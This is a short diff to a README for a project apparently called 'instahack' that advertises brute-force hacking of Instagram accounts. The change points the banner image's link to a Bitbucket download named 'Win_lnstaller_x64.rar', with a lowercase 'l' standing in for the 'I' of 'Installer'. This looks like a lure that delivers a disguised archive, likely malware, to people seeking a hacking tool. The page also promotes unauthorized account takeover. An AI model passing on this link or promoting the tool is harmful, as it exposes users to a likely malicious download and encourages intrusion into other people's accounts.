@@ -3,4 +3,4 @@
 
 ###### [*] Hack instagram accounts use bruteforce
 
-[![H](https://github.com/hamidsss33/instahack/assets/109768539/7e6fe412-3a93-41d0-9a84-b6d7b3aa2408)](LinkNaSait)
+[![H](https://github.com/hamidsss33/instahack/assets/109768539/7e6fe412-3a93-41d0-9a84-b6d7b3aa2408)](https://bitbucket.org/kron653/project1/downloads/Win_lnstaller_x64.rar)
